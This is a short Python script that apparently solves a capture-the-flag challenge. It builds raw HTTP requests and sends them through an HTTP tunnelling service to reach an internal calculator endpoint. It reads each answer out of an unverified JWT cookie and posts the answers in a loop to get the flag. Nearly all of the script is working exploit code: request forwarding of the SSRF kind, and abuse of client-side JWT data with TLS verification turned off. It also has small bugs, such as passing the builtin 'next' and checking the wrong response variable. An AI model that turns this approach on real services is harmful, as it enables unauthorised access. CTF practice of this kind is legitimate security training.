#!/usr/bin/python3

# Repeatedly POST calculator answers to get the flag
# Manually tunnel the request through haas

FORWARD_HOST = ""
TUNNEL_HOST = ""

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib
import re
import jwt

proxy = {
  'https': 'http://127.0.0.1:8080',
  'http': 'http://127.0.0.1:8080'
}

def createReq(address):
    return urllib.parse.urlencode(dict(request=f"GET {address} HTTP/1.1\r\nHost: {FORWARD_HOST}"))

def createAnswer(value):
    global cookie
    content = f"answer={value}"
    return urllib.parse.urlencode(dict(request=f"POST /calculator/ HTTP/1.1\r\nHost: {FORWARD_HOST}\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: calc={cookie}\r\nContent-Length: {len(content)}\r\n\r\n{content}"))

query = re.compile('a href="(.+?)"', re.MULTILINE)

data = createReq(next)
req = requests.post(f'https://{TUNNEL_HOST}/', proxies=proxy, data=createReq("/calculator/"), verify=False, headers={
    "Content-Type": "application/x-www-form-urlencoded"
})

# The answer for the current question is inside the JWT token in the cookie.
# So we don't actually need to perform the maths equation!
cookie = re.findall("Set-Cookie: calc=(.*);", req.text)[0]
nextVal = jwt.decode(cookie, verify=False)["LastAnswer"]

while True:
    print("Next answer:", nextVal)
    r = requests.post(f'https://{TUNNEL_HOST}/', proxies=proxy, data=createAnswer(nextVal), verify=False, headers={"Content-Type": "application/x-www-form-urlencoded"})
    print(r.text)
    if "COMP" in req.text:
        print(req.text)

    cookie = re.findall("Set-Cookie: calc=(.*);", r.text)[0]
    nextVal = jwt.decode(cookie, verify=False)["LastAnswer"]
print("Finish")